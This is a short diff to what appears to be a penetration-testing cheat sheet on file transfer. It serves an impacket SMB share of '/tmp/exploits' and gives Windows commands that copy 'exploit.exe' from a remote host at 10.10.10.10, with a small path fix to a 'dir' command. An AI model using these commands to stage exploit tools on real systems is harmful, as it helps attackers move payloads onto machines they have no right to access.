@@ -5,7 +5,7 @@ python /usr/share/doc/python-impacket/examples/smbserver.py share /tmp/exploits
 smblient -L 10.10.10.10 --no-pass
 - Client Windows
 net view \\10.10.10.10
-dir \\10.10.10.10
+dir \\10.10.10.10\share
 copy \\10.10.10.10\share\exploit.exe .
 
 # TFTP
